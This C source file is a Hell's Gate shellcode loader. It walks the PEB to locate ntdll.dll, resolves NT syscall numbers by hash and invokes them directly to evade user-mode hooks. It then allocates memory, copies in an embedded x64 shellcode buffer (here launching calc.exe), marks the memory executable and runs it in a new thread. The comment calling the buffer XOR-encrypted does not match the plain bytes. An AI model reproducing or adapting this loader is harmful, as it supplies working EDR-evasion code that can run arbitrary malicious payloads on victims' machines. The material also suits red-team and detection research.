//includes
#include "encryption.h"
#include "utils.h"
#include "types.h"

//shellcode to inject encrypted with XOR, key "A"
//BYTE buf[] =
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

// Declare the external assembly procedures
extern void HellsGate(WORD wSystemCall);
extern HellDescent();

//main function
int main(int argc, char* argv[])
{
	//module we want to find in memory C:\Windows\SYSTEM32\ntdll.dll
	const PWSTR TargetDLL = L"C:\\Windows\\SYSTEM32\\ntdll.dll";

	//perform PEB walking
	PPEB pPeb = GetPEBAddress();
	PPEB_LDR_DATA pLdr = GetLdrAddress(pPeb);
	PLIST_ENTRY pHeadNode = GetModuleList(pLdr);
	DWORD_PTR pModuleAddr = GetModuleBaseAddr(TargetDLL, pHeadNode);
	PBYTE pBase = (PBYTE)pModuleAddr;

	//make sure base address is not NULL
	if (pBase == 0 || pBase == NULL)
	{
		fprintf(stderr, "[!] Error finding %ls in memory\n", TargetDLL);
		exit(-1);
	}

	//output
	printf("[+] Found PEB at %p\n", pPeb);
	printf("[+] Found PEB_LDR_DATA struct at %p\n", pLdr);
	printf("[+] Found head of InMemoryOrderModuleList at %p\n", pHeadNode);
	printf("[+] Found %ls at %x\n", TargetDLL, pModuleAddr);

	//find address of functions we need to detect if hooks are present
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleAddr;

	//error handling
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		fprintf(stderr, "[!] Error with casting to IMAGE_DOS_HEADER\n");
		exit(-1);
	}

	PIMAGE_NT_HEADERS pNtHeader = GetNTHeader(pBase, pDosHeader);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		fprintf(stderr, "[!] Error with getting NT HEADER struct\n");
		exit(-1);
	}

	PIMAGE_EXPORT_DIRECTORY pImgExportDir = GetImgExportDir(pBase, pNtHeader);

	//output
	printf("[+] Successfully parsed DOS header at address %p\n", pDosHeader);
	printf("[+] Successfully parsed NT header at address %p\n", pNtHeader);
	printf("[+] Successfully parsed the export directory at address %p\n", pImgExportDir);
	printf("[+] Successfully retrieved function names, addresses and ordinals\n");

	//populate VX_TABLE
	//initialize the hashes we need to check for, if found we save the SSN
	printf("[+] Initializing VX_TABLE values\n");
	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	Table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741;
	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtAllocateVirtualMemory))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtAllocateVirtualMemory...\n");
		exit(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtCreateThreadEx))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtCreateThreadEx...\n");
		exit(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWriteVirtualMemory))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtWriteVirtualMemory...\n");
		exit(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtProtectVirtualMemory))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtProtectVirtualMemory...\n");
		exit(-1);
	}

	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWaitForSingleObject))
	{
		fprintf(stderr, "[!] Error with GetVxTableEntry for NtWaitForSingleObject...\n");
		exit(-1);
	}

	//perform the systemcalls
	// Allocate memory for the shellcode
	NTSTATUS status = 0x00000000;
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(buf);
	HellsGate(Table.NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

	// Write Memory
	VxMoveMemory(lpAddress, buf, sizeof(buf));

	// Change page permissions
	ULONG ulOldProtect = 0;
	HellsGate(Table.NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(Table.NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	HellsGate(Table.NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hHostThread, FALSE, &Timeout);

	//for attaching a debugger
	getchar();

	return 0;
}